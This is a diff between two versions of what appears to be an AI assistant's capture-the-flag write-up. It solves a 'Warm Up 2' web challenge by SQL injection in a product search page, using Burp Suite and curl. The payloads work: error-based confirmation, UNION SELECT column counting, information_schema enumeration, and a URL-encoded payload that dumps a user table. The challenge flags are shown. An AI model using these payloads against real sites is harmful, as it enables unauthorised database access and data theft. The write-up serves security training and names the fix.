@@ -1,97 +1,79 @@
-Absolutely. Here's a complete, beginner-friendly manual walkthrough of exactly how this challenge is solved by hand — both with a **browser + Burp Suite** and with **curl**. I'll explain not just the *what* but the *why* at each step.
+New instance confirmed working. Real flag: `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`. Here's a clean Burp-style writeup.
 
 ---
 
-# Warm Up 2 — Manual SQL Injection Walkthrough
+# Warm Up 2 — Web Writeup (Burp Suite)
 
-## 0. Understand the target first
+**Flag:** `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`
 
-Open the site: `http://<host>:8001/`
-
-Browse the pages:
-- `index.php` — home
-- `about.php` — static
-- `products.php` — has a **search box** (`<form method="GET" action="products.php">` with `name="search"`)
-
-A search box that queries a product list is the classic SQL injection (SQLi) candidate. The form is `GET`, so the input ends up in the URL:
-
+## Recon
+Browse the site. The **Products** page has a search box that submits via GET:
 ```
-http://<host>:8001/products.php?search=hoodie
+GET /products.php?search=hoodie
 ```
+A search feature talking to a product database = prime **SQL injection** target.
 
-The server response headers also tell us the stack:
-```
-Server: Apache/2.4.65 (Debian)
-X-Powered-By: PHP/8.1.34
-```
-PHP + (we'll soon confirm) MariaDB/MySQL.
+## Setup in Burp
+1. Proxy your browser through Burp (or use Burp's built-in browser).
+2. Search for anything on `products.php` so the request lands in **Proxy → HTTP history**.
+3. Right-click it → **Send to Repeater** (Ctrl+R). We'll do everything from Repeater now — edit the `search` value, hit **Send**, read the response.
+
+> Tip: when you type a payload, select it and press **Ctrl+U** so Burp URL-encodes it before sending.
 
 ---
 
-## 1. Find the vulnerability — the single quote `'`
+## Step 1 — Break the query with a single quote
+In Repeater set:
+```
+search='
+```
+**Response:** a MariaDB `Fatal error` page. SQLi confirmed, and it even drops a teaser flag:
+```
+Flag: HNYX{MySqL_3rR0r_4nYwh3R3???!!}
+```
+This is a *hint*, not the real flag. The error confirms the backend is MySQL/MariaDB and that errors are verbose — exactly what we need.
 
-The whole challenge hint is *"an interesting behavior with just a single quote."*
+## Step 2 — Count the columns
+We want a **UNION** to inject our own rows, but UNION needs a matching column count. Try:
+```
+search=' UNION SELECT 1,2,3-- -      → error (wrong count)
+search=' UNION SELECT 1,2,3,4-- -    → works! a card shows "2 / 3 / $4.00"
+```
+So the query has **4 columns**, and columns **2, 3, 4** are the ones printed on the page (name / description / price). `-- -` just comments out the rest of the original query.
 
-In SQL, string values are wrapped in single quotes:
-```sql
-SELECT * FROM products WHERE name LIKE '%hoodie%'
+## Step 3 — Find where the flag lives
+List every database/table/column using `information_schema`:
 ```
-If the app pastes your input directly into that string **without sanitizing**, then injecting a `'` closes the string early and corrupts the SQL syntax → the database throws an error.
+search=' UNION SELECT 1,table_schema,table_name,column_name FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys')-- -
+```
+Among several decoy databases, one stands out:
+```
+network_portal . user . flag   ← the real target (it's in ANOTHER database)
+```
+This matches the teaser's hint to look further.
 
-**Test it.** In the search box type a single quote:
+## Step 4 — Dump the flag
+Select the real columns, fully qualifying the other database as `network_portal.user`:
 ```
-'
+search=' UNION SELECT 1,username,flag,role FROM network_portal.user-- -
 ```
-Or directly in the URL:
+**Response** shows a new product card:
 ```
-http://<host>:8001/products.php?search='
-```
-
-> In Burp: turn on **Proxy → Intercept**, submit the search in the browser, send the request to **Repeater** (Ctrl+R). In Repeater you can edit the `search=` value and hit **Send** repeatedly. Remember to URL-encode special chars — Burp Repeater has a right-click → "Convert selection → URL encode key characters" or just press **Ctrl+U** on selected text.
-
-**Result:**
-```
-Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
-check the manual that corresponds to your MariaDB server version ...
-near ''' at line 1 in /var/www/html/products.php:31
-... mysqli->query('SELECT * FROM p...')
-... Flag: HNYX{MySqL_3rR0r_4nYwh3R3???!!}
+youfoundtherealadmin → HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}
 ```
 
-This single error tells us **four** important things:
-1. The input is injectable (SQLi confirmed).
-2. Backend is **MariaDB/MySQL** (`mysqli`).
-3. **Verbose errors are on** → we can do *error-based* enumeration if needed.
-4. There's a **decoy/teaser flag** embedded in the error. The challenge says *"From the error, it will help you for further enumeration... Now try to search for the flag **again**."* → the *real* flag is elsewhere; keep going.
+🏁 **Flag:** `HNYX{D0_y0u_3xPeCt_th3_fl4g_1s_ln_4n0th3r_d4t4B@s3??}`
 
 ---
 
-## 2. Work out the query shape (how many columns)
+## Quick recap
+`'` → confirm SQLi → `UNION SELECT 1,2,3,4` finds 4 columns → `information_schema` reveals a `flag` column in the **network_portal** database → UNION dump returns the flag.
 
-To pull our own data out of the page, we use a **UNION SELECT**. A UNION glues a second query's rows onto the first — but it only works if **both queries have the same number of columns**. So step one is finding the column count.
+**Root cause:** user input concatenated straight into the SQL string (no prepared statements) plus verbose errors enabled. Fix with parameterized queries and disabled error display.
 
-Two ways:
+---
 
-### Method A — `ORDER BY` (incrementing)
-You can sort by column index; when the index exceeds the real column count, you get an error.
+If it helps, the exact value to paste into the Repeater request line for the final step (already URL-encoded) is:
 ```
-?search=' ORDER BY 1-- -
-?search=' ORDER BY 2-- -
-?search=' ORDER BY 5-- -    ← errors → fewer than 5 columns
+GET /products.php?search=%27%20UNION%20SELECT%201%2Cusername%2Cflag%2Crole%20FROM%20network_portal.user--%20-
 ```
-
-### Method B — `UNION SELECT` with increasing numbers (what I used)
-```
-?search=' UNION SELECT 1,2,3-- -        → "different number of columns" error
-?search=' UNION SELECT 1,2,3,4-- -      → WORKS (page renders a new row)
-?search=' UNION SELECT 1,2,3,4,5-- -    → error again
-```
-So the table has **4 columns**.
-
-**Anatomy of the payload** — `' UNION SELECT 1,2,3,4-- -`:
-- `'` → closes the original string literal.
-- `UNION SELECT 1,2,3,4` → our injected query with 4 placeholder values.
-- `-- -` → SQL comment. Everything after it (the app's trailing `%'` etc.) is ignored. In MySQL/MariaDB the comment is `-- ` (dash-dash-**space**); adding a trailing char like `-- -` guarantees the required space survives.
-
-> **URL-encoding matters.** Spaces become `%20` (or `+`), and you must encode `'` and `#` etc. In a browser URL bar the browser often encodes for you, but to b
-... [6762 chars omitted]
